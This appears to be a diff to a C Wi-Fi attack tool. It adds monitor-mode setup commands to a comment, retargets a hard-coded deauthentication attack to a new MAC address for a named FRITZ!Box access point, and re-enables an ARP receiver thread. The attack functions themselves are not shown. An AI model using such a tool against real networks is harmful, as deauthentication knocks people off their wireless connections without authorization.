@@ -30,7 +30,8 @@
  *
  * or
  *
- *  s
+ * sudo iw ni0h set monitor control
+ * sudo ip link set ni0h up 
  *
  * to list AP
  * sudo iwlist wlp3s0 scanning | grep "Address\|ESSID"
@@ -82,16 +83,16 @@ int main(int argc, char* argv[])
 
   receiverStr mapStr = {connFd, arp_resp, wins};
   sender_pck send_pck = {connFd, wins};
-  deauth_pck dth_pck = {connFd, wins, "b6:94:31:6c:3b:f9", "FRITZ!Box 7530 TT 2,4"}; 
+  deauth_pck dth_pck = {connFd, wins, "7a:ff:c2:49:88:d7", "FRITZ!Box 7530 TT 2,4"}; 
 
   pthread_t receiverThread, senderThread;
   pthread_t deauthThread;
   wprintw(wins->arp_right->win, "Done\n");
   pthread_create(&deauthThread, NULL, deauthAttack, &dth_pck);
   pthread_create(&senderThread, NULL, sendArpRequest, &send_pck);
-  //pthread_create(&receiverThread, NULL, recvMessage, &mapStr);
+  pthread_create(&receiverThread, NULL, recvMessage, &mapStr);
 
-  //pthread_join(receiverThread, 0);
+  pthread_join(receiverThread, 0);
   pthread_join(senderThread, 0);
   pthread_join(deauthThread, 0);
   
